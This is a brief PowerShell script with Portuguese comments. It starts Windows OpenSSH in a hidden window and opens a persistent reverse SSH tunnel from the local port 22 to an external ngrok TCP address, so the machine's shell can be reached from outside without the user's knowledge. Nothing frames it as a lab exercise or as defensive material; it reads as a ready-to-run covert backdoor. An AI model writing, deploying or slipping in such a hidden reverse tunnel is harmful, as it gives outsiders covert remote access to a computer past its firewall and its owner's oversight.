# Caminho absoluto do SSH
$sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"

# Comando SSH
$sshArgs = "-o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 2222:localhost:22 u0_a416@0.tcp.sa.ngrok.io -p 19624 -N"

# Executa SSH em processo invisível
Start-Process -FilePath $sshPath -ArgumentList $sshArgs -WindowStyle Hidden


